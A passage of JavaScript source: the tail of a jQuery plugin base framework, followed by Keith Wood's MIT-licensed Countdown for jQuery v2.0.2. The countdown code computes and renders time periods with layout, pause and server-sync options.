        if ($[c]._isNotChained(a, b)) {
          return $[c][a].apply($[c], [this[0]].concat(b));
        }
        return this.each(function () {
          if (typeof a === 'string') {
            if (a[0] === '_' || !$[c][a]) {
              throw 'Unknown method: ' + a;
            }
            $[c][a].apply($[c], [this].concat(b));
          } else {
            $[c]._attach(this, a);
          }
        });
      };
    },
    setDefaults: function (a) {
      $.extend(this.defaultOptions, a || {});
    },
    _isNotChained: function (a, b) {
      if (a === 'option' && (b.length === 0 || b.length === 1 && typeof b[0] === 'string')) {
        return true;
      }
      return $.inArray(a, this._getters) > -1;
    },
    _attach: function (a, b) {
      a = $(a);
      if (a.hasClass(this._getMarker())) {
        return;
      }
      a.addClass(this._getMarker());
      b = $.extend({}, this.defaultOptions, this._getMetadata(a), b || {});
      var c = $.extend({
        name: this.name,
        elem: a,
        options: b
      }, this._instSettings(a, b));
      a.data(this.name, c);
      this._postAttach(a, c);
      this.option(a, b);
    },
    _instSettings: function (a, b) {
      return {};
    },
    _postAttach: function (a, b) {},
    _getMetadata: function (d) {
      try {
        var f = d.data(this.name.toLowerCase()) || '';
        f = f.replace(/'/g, '"');
        f = f.replace(/([a-zA-Z0-9]+):/g, function (a, b, i) {
          var c = f.substring(0, i).match(/"/g);
          return !c || c.length % 2 === 0 ? '"' + b + '":' : b + ':';
        });
        f = $.parseJSON('{' + f + '}');
        for (var g in f) {
          var h = f[g];
          if (typeof h === 'string' && h.match(/^new Date\((.*)\)$/)) {
            f[g] = eval(h);
          }
        }
        return f;
      } catch (e) {
        return {};
      }
    },
    _getInst: function (a) {
      return $(a).data(this.name) || {};
    },
    option: function (a, b, c) {
      a = $(a);
      var d = a.data(this.name);
      if (!b || typeof b === 'string' && c == null) {
        var e = (d || {}).options;
        return e && b ? e[b] : e;
      }
      if (!a.hasClass(this._getMarker())) {
        return;
      }
      var e = b || {};
      if (typeof b === 'string') {
        e = {};
        e[b] = c;
      }
      this._optionsChanged(a, d, e);
      $.extend(d.options, e);
    },
    _optionsChanged: function (a, b, c) {},
    destroy: function (a) {
      a = $(a);
      if (!a.hasClass(this._getMarker())) {
        return;
      }
      this._preDestroy(a, this._getInst(a));
      a.removeData(this.name).removeClass(this._getMarker());
    },
    _preDestroy: function (a, b) {}
  });
  function camelCase(c) {
    return c.replace(/-([a-z])/g, function (a, b) {
      return b.toUpperCase();
    });
  }
  $.JQPlugin = {
    createPlugin: function (a, b) {
      if (typeof a === 'object') {
        b = a;
        a = 'JQPlugin';
      }
      a = camelCase(a);
      var c = camelCase(b.name);
      JQClass.classes[c] = JQClass.classes[a].extend(b);
      new JQClass.classes[c]();
    }
  };
})(jQuery);

/* http://keith-wood.name/countdown.html
   Countdown for jQuery v2.0.2.
   Written by Keith Wood (kbwood{at}iinet.com.au) January 2008.
   Available under the MIT (http://keith-wood.name/licence.html) license.
   Please attribute the author if you use it. */
(function ($) {
  var w = 'countdown';
  var Y = 0;
  var O = 1;
  var W = 2;
  var D = 3;
  var H = 4;
  var M = 5;
  var S = 6;
  $.JQPlugin.createPlugin({
    name: w,
    defaultOptions: {
      until: null,
      since: null,
      timezone: null,
      serverSync: null,
      format: 'dHMS',
      layout: '',
      compact: false,
      padZeroes: false,
      significant: 0,
      description: '',
      expiryUrl: '',
      expiryText: '',
      alwaysExpire: false,
      onExpiry: null,
      onTick: null,
      tickInterval: 1
    },
    regionalOptions: {
      '': {
        labels: ['Years', 'Months', 'Weeks', 'Days', 'Hours', 'Minutes', 'Seconds'],
        labels1: ['Year', 'Month', 'Week', 'Day', 'Hour', 'Minute', 'Second'],
        compactLabels: ['y', 'm', 'w', 'd'],
        whichLabels: null,
        digits: ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
        timeSeparator: ':',
        isRTL: false
      }
    },
    _getters: ['getTimes'],
    _rtlClass: w + '-rtl',
    _sectionClass: w + '-section',
    _amountClass: w + '-amount',
    _periodClass: w + '-period',
    _rowClass: w + '-row',
    _holdingClass: w + '-holding',
    _showClass: w + '-show',
    _descrClass: w + '-descr',
    _timerElems: [],
    _init: function () {
      var c = this;
      this._super();
      this._serverSyncs = [];
      var d = typeof Date.now == 'function' ? Date.now : function () {
        return new Date().getTime();
      };
      var e = window.performance && typeof window.performance.now == 'function';
      function timerCallBack(a) {
        var b = a < 1e12 ? e ? performance.now() + performance.timing.navigationStart : d() : a || d();
        if (b - g >= 1000) {
          c._updateElems();
          g = b;
        }
        f(timerCallBack);
      }
      var f = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame || null;
      var g = 0;
      if (!f || $.noRequestAnimationFrame) {
        $.noRequestAnimationFrame = null;
        setInterval(function () {
          c._updateElems();
        }, 980);
      } else {
        g = window.animationStartTime || window.webkitAnimationStartTime || window.mozAnimationStartTime || window.oAnimationStartTime || window.msAnimationStartTime || d();
        f(timerCallBack);
      }
    },
    UTCDate: function (a, b, c, e, f, g, h, i) {
      if (typeof b == 'object' && b.constructor == Date) {
        i = b.getMilliseconds();
        h = b.getSeconds();
        g = b.getMinutes();
        f = b.getHours();
        e = b.getDate();
        c = b.getMonth();
        b = b.getFullYear();
      }
      var d = new Date();
      d.setUTCFullYear(b);
      d.setUTCDate(1);
      d.setUTCMonth(c || 0);
      d.setUTCDate(e || 1);
      d.setUTCHours(f || 0);
      d.setUTCMinutes((g || 0) - (Math.abs(a) < 30 ? a * 60 : a));
      d.setUTCSeconds(h || 0);
      d.setUTCMilliseconds(i || 0);
      return d;
    },
    periodsToSeconds: function (a) {
      return a[0] * 31557600 + a[1] * 2629800 + a[2] * 604800 + a[3] * 86400 + a[4] * 3600 + a[5] * 60 + a[6];
    },
    resync: function () {
      var d = this;
      $('.' + this._getMarker()).each(function () {
        var a = $.data(this, d.name);
        if (a.options.serverSync) {
          var b = null;
          for (var i = 0; i < d._serverSyncs.length; i++) {
            if (d._serverSyncs[i][0] == a.options.serverSync) {
              b = d._serverSyncs[i];
              break;
            }
          }
          if (b[2] == null) {
            var c = $.isFunction(a.options.serverSync) ? a.options.serverSync.apply(this, []) : null;
            b[2] = (c ? new Date().getTime() - c.getTime() : 0) - b[1];
          }
          if (a._since) {
            a._since.setMilliseconds(a._since.getMilliseconds() + b[2]);
          }
          a._until.setMilliseconds(a._until.getMilliseconds() + b[2]);
        }
      });
      for (var i = 0; i < d._serverSyncs.length; i++) {
        if (d._serverSyncs[i][2] != null) {
          d._serverSyncs[i][1] += d._serverSyncs[i][2];
          delete d._serverSyncs[i][2];
        }
      }
    },
    _instSettings: function (a, b) {
      return {
        _periods: [0, 0, 0, 0, 0, 0, 0]
      };
    },
    _addElem: function (a) {
      if (!this._hasElem(a)) {
        this._timerElems.push(a);
      }
    },
    _hasElem: function (a) {
      return $.inArray(a, this._timerElems) > -1;
    },
    _removeElem: function (b) {
      this._timerElems = $.map(this._timerElems, function (a) {
        return a == b ? null : a;
      });
    },
    _updateElems: function () {
      for (var i = this._timerElems.length - 1; i >= 0; i--) {
        this._updateCountdown(this._timerElems[i]);
      }
    },
    _optionsChanged: function (a, b, c) {
      if (c.layout) {
        c.layout = c.layout.replace(/&lt;/g, '<').replace(/&gt;/g, '>');
      }
      this._resetExtraLabels(b.options, c);
      var d = b.options.timezone != c.timezone;
      $.extend(b.options, c);
      this._adjustSettings(a, b, c.until != null || c.since != null || d);
      var e = new Date();
      if (b._since && b._since < e || b._until && b._until > e) {
        this._addElem(a[0]);
      }
      this._updateCountdown(a, b);
    },
    _updateCountdown: function (a, b) {
      a = a.jquery ? a : $(a);
      b = b || this._getInst(a);
      if (!b) {
        return;
      }
      a.html(this._generateHTML(b)).toggleClass(this._rtlClass, b.options.isRTL);
      if ($.isFunction(b.options.onTick)) {
        var c = b._hold != 'lap' ? b._periods : this._calculatePeriods(b, b._show, b.options.significant, new Date());
        if (b.options.tickInterval == 1 || this.periodsToSeconds(c) % b.options.tickInterval == 0) {
          b.options.onTick.apply(a[0], [c]);
        }
      }
      var d = b._hold != 'pause' && (b._since ? b._now.getTime() < b._since.getTime() : b._now.getTime() >= b._until.getTime());
      if (d && !b._expiring) {
        b._expiring = true;
        if (this._hasElem(a[0]) || b.options.alwaysExpire) {
          this._removeElem(a[0]);
          if ($.isFunction(b.options.onExpiry)) {
            b.options.onExpiry.apply(a[0], []);
          }
          if (b.options.expiryText) {
            var e = b.options.layout;
            b.options.layout = b.options.expiryText;
            this._updateCountdown(a[0], b);
            b.options.layout = e;
          }
          if (b.options.expiryUrl) {
            window.location = b.options.expiryUrl;
          }
        }
        b._expiring = false;
      } else if (b._hold == 'pause') {
        this._removeElem(a[0]);
      }
    },
    _resetExtraLabels: function (a, b) {
      for (var n in b) {
        if (n.match(/[Ll]abels[02-9]|compactLabels1/)) {
          a[n] = b[n];
        }
      }
      for (var n in a) {
        if (n.match(/[Ll]abels[02-9]|compactLabels1/) && typeof b[n] === 'undefined') {
          a[n] = null;
        }
      }
    },
    _adjustSettings: function (a, b, c) {
      var d = null;
      for (var i = 0; i < this._serverSyncs.length; i++) {
        if (this._serverSyncs[i][0] == b.options.serverSync) {
          d = this._serverSyncs[i][1];
          break;
        }
      }
      if (d != null) {
        var e = b.options.serverSync ? d : 0;
        var f = new Date();
      } else {
        var g = $.isFunction(b.options.serverSync) ? b.options.serverSync.apply(a[0], []) : null;
        var f = new Date();
        var e = g ? f.getTime() - g.getTime() : 0;
        this._serverSyncs.push([b.options.serverSync, e]);
      }
      var h = b.options.timezone;
      h = h == null ? -f.getTimezoneOffset() : h;
      if (c || !c && b._until == null && b._since == null) {
        b._since = b.options.since;
        if (b._since != null) {
          b._since = this.UTCDate(h, this._determineTime(b._since, null));
          if (b._since && e) {
            b._since.setMilliseconds(b._since.getMilliseconds() + e);
          }
        }
        b._until = this.UTCDate(h, this._determineTime(b.options.until, f));
        if (e) {
          b._until.setMilliseconds(b._until.getMilliseconds() + e);
        }
      }
      b._show = this._determineShow(b);
    },
    _preDestroy: function (a, b) {
      this._removeElem(a[0]);
      a.empty();
    },
    pause: function (a) {
      this._hold(a, 'pause');
    },
    lap: function (a) {
      this._hold(a, 'lap');
    },
    resume: function (a) {
      this._hold(a, null);
    },
    toggle: function (a) {
      var b = $.data(a, this.name) || {};
      this[!b._hold ? 'pause' : 'resume'](a);
    },
    toggleLap: function (a) {
      var b = $.data(a, this.name) || {};
      this[!b._hold ? 'lap' : 'resume'](a);
    },
    _hold: function (a, b) {
      var c = $.data(a, this.name);
      if (c) {
        if (c._hold == 'pause' && !b) {
          c._periods = c._savePeriods;
          var d = c._since ? '-' : '+';
          c[c._since ? '_since' : '_until'] = this._determineTime(d + c._periods[0] + 'y' + d + c._periods[1] + 'o' + d + c._periods[2] + 'w' + d + c._periods[3] + 'd' + d + c._periods[4] + 'h' + d + c._periods[5] + 'm' + d + c._periods[6] + 's');
          this._addElem(a);
        }
        c._hold = b;
        c._savePeriods = b == 'pause' ? c._periods : null;
        $.data(a, this.name, c);
        this._updateCountdown(a, c);
      }
    },
    getTimes: function (a) {
      var b = $.data(a, this.name);
      return !b ? null : b._hold == 'pause' ? b._savePeriods : !b._hold ? b._periods : this._calculatePeriods(b, b._show, b.options.significant, new Date());
    },
    _determineTime: function (k, l) {
      var m = this;
      var n = function (a) {
        var b = new Date();
        b.setTime(b.getTime() + a * 1000);
        return b;
      };
      var o = function (a) {
        a = a.toLowerCase();
        var b = new Date();
        var c = b.getFullYear();
        var d = b.getMonth();
        var e = b.getDate();
        var f = b.getHours();
        var g = b.getMinutes();
        var h = b.getSeconds();
        var i = /([+-]?[0-9]+)\s*(s|m|h|d|w|o|y)?/g;
        var j = i.exec(a);
        while (j) {
          switch (j[2] || 's') {
            case 's':
              h += parseInt(j[1], 10);
              break;
            case 'm':
              g += parseInt(j[1], 10);
              break;
            case 'h':
              f += parseInt(j[1], 10);
              break;
            case 'd':
              e += parseInt(j[1], 10);
              break;
            case 'w':
              e += parseInt(j[1], 10) * 7;
              break;
            case 'o':
              d += parseInt(j[1], 10);
              e = Math.min(e, m._getDaysInMonth(c, d));
              break;
            case 'y':
              c += parseInt(j[1], 10);
              e = Math.min(e, m._getDaysInMonth(c, d));
              break;
          }
          j = i.exec(a);
        }
        return new Date(c, d, e, f, g, h, 0);
      };
      var p = k == null ? l : typeof k == 'string' ? o(k) : typeof k == 'number' ? n(k) : k;
      if (p) p.setMilliseconds(0);
      return p;
    },
    _getDaysInMonth: function (a, b) {
      return 32 - new Date(a, b, 32).getDate();
    },
    _normalLabels: function (a) {
      return a;
    },
    _generateHTML: function (c) {
      var d = this;
      c._periods = c._hold ? c._periods : this._calculatePeriods(c, c._show, c.options.significant, new Date());
      var e = false;
      var f = 0;
      var g = c.options.significant;
      var h = $.extend({}, c._show);
      for (var i = Y; i <= S; i++) {
        e |= c._show[i] == '?' && c._periods[i] > 0;
        h[i] = c._show[i] == '?' && !e ? null : c._show[i];
        f += h[i] ? 1 : 0;
        g -= c._periods[i] > 0 ? 1 : 0;
      }
      var j = [false, false, false, false, false, false, false];
      for (var i = S; i >= Y; i--) {
        if (c._show[i]) {
          if (c._periods[i]) {
            j[i] = true;
          } else {
            j[i] = g > 0;
            g--;
          }
        }
      }
      var k = c.options.compact ? c.options.compactLabels : c.options.labels;
      var l = c.options.whichLabels || this._normalLabels;
      var m = function (a) {
        var b = c.options['compactLabels' + l(c._periods[a])];
        return h[a] ? d._translateDigits(c, c._periods[a]) + (b ? b[a] : k[a]) + ' ' : '';
      };
      var n = c.options.padZeroes ? 2 : 1;
      var o = function (a) {
        var b = c.options['labels' + l(c._periods[a])];
        return !c.options.significant && h[a] || c.options.significant && j[a] ? '<span class="' + d._sectionClass + '">' + '<span class="' + d._amountClass + '">' + d._minDigits(c, c._periods[a], n) + '</span>' + '<span class="' + d._periodClass + '">' + (b ? b[a] : k[a]) + '</span></span>' : '';
      };
      return c.options.layout ? this._buildLayout(c, h, c.options.layout, c.options.compact, c.options.significant, j) : (c.options.compact ? '<span class="' + this._rowClass + ' ' + this._amountClass + (c._hold ? ' ' + this._holdingClass : '') + '">' + m(Y) + m(O) + m(W) + m(D) + (h[H] ? this._minDigits(c, c._periods[H], 2) : '') + (h[M] ? (h[H] ? c.options.timeSeparator : '') + this._minDigits(c, c._periods[M], 2) : '') + (h[S] ? (h[H] || h[M] ? c.options.timeSeparator : '') + this._minDigits(c, c._periods[S], 2) : '') : '<span class="' + this._rowClass + ' ' + this._showClass + (c.options.significant || f) + (c._hold ? ' ' + this._holdingClass : '') + '">' + o(Y) + o(O) + o(W) + o(D) + o(H) + o(M) + o(S)) + '</span>' + (c.options.description ? '<span class="' + this._rowClass + ' ' + this._descrClass + '">' + c.options.description + '</span>' : '');
    },
    _buildLayout: function (c, d, e, f, g, h) {
      var j = c.options[f ? 'compactLabels' : 'labels'];
      var k = c.options.whichLabels || this._normalLabels;
      var l = function (a) {
        return (c.options[(f ? 'compactLabels' : 'labels') + k(c._periods[a])] || j)[a];
      };
      var m = function (a, b) {
        return c.options.digits[Math.floor(a / b) % 10];
      };
      var o = {
        desc: c.options.description,
        sep: c.options.timeSeparator,
        yl: l(Y),
        yn: this._minDigits(c, c._periods[Y], 1),
        ynn: this._minDigits(c, c._periods[Y], 2),
        ynnn: this._minDigits(c, c._periods[Y], 3),
        y1: m(c._periods[Y], 1),
        y10: m(c._periods[Y], 10),
        y100: m(c._periods[Y], 100),
        y1000: m(c._periods[Y], 1000),
        ol: l(O),
        on: this._minDigits(c, c._periods[O], 1),
        onn: this._minDigits(c, c._periods[O], 2),
        onnn: this._minDigits(c, c._periods[O], 3),
        o1: m(c._periods[O], 1),
        o10: m(c._periods[O], 10),
        o100: m(c._periods[O], 100),
        o1000: m(c._periods[O], 1000),
        wl: l(W),
        wn: this._minDigits(c, c._periods[W], 1),
        wnn: this._minDigits(c, c._periods[W], 2),
        wnnn: this._minDigits(c, c._periods[W], 3),
        w1: m(c._periods[W], 1),
        w10: m(c._periods[W], 10),
        w100: m(c._periods[W], 100),
        w1000: m(c._periods[W], 1000),
        dl: l(D),
        dn: this._minDigits(c, c._periods[D], 1),
        dnn: this._minDigits(c, c._periods[D], 2),
        dnnn: this._minDigits(c, c._periods[D], 3),
        d1: m(c._periods[D], 1),
        d10: m(c._periods[D], 10),
        d100: m(c._periods[D], 100),
        d1000: m(c._periods[D], 1000),
        hl: l(H),
        hn: this._minDigits(c, c._periods[H], 1),
        hnn: this._minDigits(c, c._periods[H], 2),
        hnnn: this._minDigits(c, c._periods[H], 3),
        h1: m(c._periods[H], 1),
        h10: m(c._periods[H], 10),
        h100: m(c._periods[H], 100),
        h1000: m(c._periods[H], 1000),
        ml: l(M),
        mn: this._minDigits(c, c._periods[M], 1),
        mnn: this._minDigits(c, c._periods[M], 2),
        mnnn: this._minDigits(c, c._periods[M], 3),
        m1: m(c._periods[M], 1),
        m10: m(c._periods[M], 10),
        m100: m(c._periods[M], 100),
        m1000: m(c._periods[M], 1000),
        sl: l(S),
        sn: this._minDigits(c, c._periods[S], 1),
        snn: this._minDigits(c, c._periods[S], 2),
        snnn: this._minDigits(c, c._periods[S], 3),
        s1: m(c._periods[S], 1),
        s10: m(c._periods[S], 10),
        s100: m(c._periods[S], 100),
        s1000: m(c._periods[S], 1000)
      };
      var p = e;
      for (var i = Y; i <= S; i++) {
        var q = 'yowdhms'.charAt(i);
        var r = new RegExp('\\{' + q + '<\\}([\\s\\S]*)\\{' + q + '>\\}', 'g');
        p = p.replace(r, !g && d[i] || g && h[i] ? '$1' : '');
      }
      $.each(o, function (n, v) {
        var a = new RegExp('\\{' + n + '\\}', 'g');
        p = p.replace(a, v);
      });
      return p;
    },
    _minDigits: function (a, b, c) {
      b = '' + b;
      if (b.length >= c) {
        return this._translateDigits(a, b);
      }
      b = '0000000000' + b;
      return this._translateDigits(a, b.substr(b.length - c));
    },
    _translateDigits: function (b, c) {
      return ('' + c).replace(/[0-9]/g, function (a) {
        return b.options.digits[a];
      });
    },
    _determineShow: function (a) {
      var b = a.options.format;
      var c = [];
      c[Y] = b.match('y') ? '?' : b.match('Y') ? '!' : null;
      c[O] = b.match('o') ? '?' : b.match('O') ? '!' : null;
      c[W] = b.match('w') ? '?' : b.match('W') ? '!' : null;
      c[D] = b.match('d') ? '?' : b.match('D') ? '!' : null;
      c[H] = b.match('h') ? '?' : b.match('H') ? '!' : null;
      c[M] = b.match('m') ? '?' : b.match('M') ? '!' : null;
      c[S] = b.match('s') ? '?' : b.match('S') ? '!' : null;
      return c;
    },
    _calculatePeriods: function (c, d, e, f) {
      c._now = f;
      c._now.setMilliseconds(0);
      var g = new Date(c._now.getTime());
      if (c._since) {
        if (f.getTime() < c._since.getTime()) {
          c._now = f = g;
        } else {
          f = c._since;
        }
      } else {
        g.setTime(c._until.getTime());
        if (f.getTime() > c._until.getTime()) {
          c._now = f = g;
        }
      }
      var h = [0, 0, 0, 0, 0, 0, 0];
      if (d[Y] || d[O]) {
        var i = this._getDaysInMonth(f.getFullYear(), f.getMonth());
        var j = this._getDaysInMonth(g.getFullYear(), g.getMonth());
        var k = g.getDate() == f.getDate() || g.getDate() >= Math.min(i, j) && f.getDate() >= Math.min(i, j);
        var l = function (a) {
          return (a.getHours() * 60 + a.getMinutes()) * 60 + a.getSeconds();
        };
        var m = Math.max(0, (g.getFullYear() - f.getFullYear()) * 12 + g.getMonth() - f.getMonth() + (g.getDate() < f.getDate() && !k || k && l(g) < l(f) ? -1 : 0));
        h[Y] = d[Y] ? Math.floor(m / 12) : 0;
        h[O] = d[O] ? m - h[Y] * 12 : 0;
        f = new Date(f.getTime());
        var n = f.getDate() == i;
        var o = this._getDaysInMonth(f.getFullYear() + h[Y], f.getMonth() + h[O]);
        if (f.getDate() > o) {
          f.setDate(o);
        }
        f.setFullYear(f.getFullYear() + h[Y]);
        f.setMonth(f.getMonth() + h[O]);
        if (n) {
          f.setDate(o);
        }
      }
      var p = Math.floor((g.getTime() - f.getTime()) / 1000);
      var q = function (a, b) {
        h[a] = d[a] ? Math.floor(p / b) : 0;
        p -= h[a] * b;
      };
      q(W, 604800);
      q(D, 86400);
      q(H, 3600);
      q(M, 60);
      q(S, 1);
      if (p > 0 && !c._since) {
        var r = [1, 12, 4.3482, 7, 24, 60, 60];
        var s = S;
        var t = 1;
        for (var u = S; u >= Y; u--) {
          if (d[u]) {
            if (h[s] >= t) {
              h[s] = 0;
              p = 1;
            }
            if (p > 0) {
              h[u]++;
              p = 0;
              s = u;
              t = 1;
            }
          }
          t *= r[u];
        }
      }
      if (e) {
        for (var u = Y; u <= S; u++) {
          if (e && h[u]) {
            e--;
          } else if (!e) {
            h[u] = 0;
          }
        }
      }
      return h;
    }
  });
})(jQuery);
;